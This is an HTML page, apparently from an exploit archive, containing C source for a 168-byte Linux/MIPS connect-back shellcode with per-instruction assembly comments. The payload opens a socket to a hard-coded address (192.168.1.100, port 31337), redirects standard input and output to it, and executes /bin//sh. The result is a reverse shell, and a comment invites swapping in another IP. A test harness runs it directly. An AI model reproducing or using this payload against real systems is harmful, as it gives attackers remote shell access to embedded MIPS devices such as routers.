<html><head><title>Linux/mips - connect back shellcode (port 0x7a69) - 168 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * Title: Linux/MIPS - connect back shellcode (port 0x7a69) - 168 bytes.
 * Author: rigan - imrigan [sobachka] gmail.com
 */

#include &lt;stdio.h&gt;

char sc[] =
         &quot;\x24\x0f\xff\xfd&quot;        // li      t7,-3
         &quot;\x01\xe0\x20\x27&quot;        // nor     a0,t7,zero
         &quot;\x01\xe0\x28\x27&quot;        // nor     a1,t7,zero
         &quot;\x28\x06\xff\xff&quot;        // slti    a2,zero,-1
         &quot;\x24\x02\x10\x57&quot;        // li      v0,4183 ( sys_socket )
         &quot;\x01\x01\x01\x0c&quot;        // syscall 0x40404
	 
         &quot;\xaf\xa2\xff\xff&quot;        // sw      v0,-1(sp)
         &quot;\x8f\xa4\xff\xff&quot;        // lw      a0,-1(sp)
         &quot;\x24\x0f\xff\xfd&quot;        // li      t7,-3 ( sa_family = AF_INET )
         &quot;\x01\xe0\x78\x27&quot;        // nor     t7,t7,zero
         &quot;\xaf\xaf\xff\xe0&quot;        // sw      t7,-32(sp) 
         &quot;\x3c\x0e\x7a\x69&quot;        // lui     t6,0x7a69 ( sin_port = 0x7a69 )
         &quot;\x35\xce\x7a\x69&quot;        // ori     t6,t6,0x7a69
         &quot;\xaf\xae\xff\xe4&quot;        // sw      t6,-28(sp)
         
      /* ====================  You can change ip here ;) ====================== */
         &quot;\x3c\x0d\xc0\xa8&quot;        // lui     t5,0xc0a8 ( sin_addr = 0xc0a8 ... 
         &quot;\x35\xad\x01\x64&quot;        // ori     t5,t5,0x164           ...0164 )
      /* ====================================================================== */
      
         &quot;\xaf\xad\xff\xe6&quot;        // sw      t5,-26(sp)
         &quot;\x23\xa5\xff\xe2&quot;        // addi    a1,sp,-30
         &quot;\x24\x0c\xff\xef&quot;        // li      t4,-17 ( addrlen = 16 )     
         &quot;\x01\x80\x30\x27&quot;        // nor     a2,t4,zero 
         &quot;\x24\x02\x10\x4a&quot;        // li      v0,4170 ( sys_connect ) 
         &quot;\x01\x01\x01\x0c&quot;        // syscall 0x40404
	 
         &quot;\x24\x0f\xff\xfd&quot;        // li      t7,-3
         &quot;\x01\xe0\x28\x27&quot;        // nor     a1,t7,zero
         &quot;\x8f\xa4\xff\xff&quot;        // lw      a0,-1(sp)
//dup2_loop:
         &quot;\x24\x02\x0f\xdf&quot;        // li      v0,4063 ( sys_dup2 )
         &quot;\x01\x01\x01\x0c&quot;        // syscall 0x40404
         &quot;\x20\xa5\xff\xff&quot;        // addi    a1,a1,-1
         &quot;\x24\x01\xff\xff&quot;        // li      at,-1
         &quot;\x14\xa1\xff\xfb&quot;        // bne     a1,at, dup2_loop
	 
         &quot;\x28\x06\xff\xff&quot;        // slti    a2,zero,-1
         &quot;\x3c\x0f\x2f\x2f&quot;        // lui     t7,0x2f2f
         &quot;\x35\xef\x62\x69&quot;        // ori     t7,t7,0x6269
         &quot;\xaf\xaf\xff\xf4&quot;        // sw      t7,-12(sp)
         &quot;\x3c\x0e\x6e\x2f&quot;        // lui     t6,0x6e2f
         &quot;\x35\xce\x73\x68&quot;        // ori     t6,t6,0x7368
         &quot;\xaf\xae\xff\xf8&quot;        // sw      t6,-8(sp)
         &quot;\xaf\xa0\xff\xfc&quot;        // sw      zero,-4(sp)
         &quot;\x27\xa4\xff\xf4&quot;        // addiu   a0,sp,-12
         &quot;\x28\x05\xff\xff&quot;        // slti    a1,zero,-1
         &quot;\x24\x02\x0f\xab&quot;        // li      v0,4011 ( sys_execve )
         &quot;\x01\x01\x01\x0c&quot;;       // syscall 0x40404
         
void main(void)
{
       
       void(*s)(void);
       printf(&quot;size: %d\n&quot;, sizeof(sc));
       s = sc;
       s();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
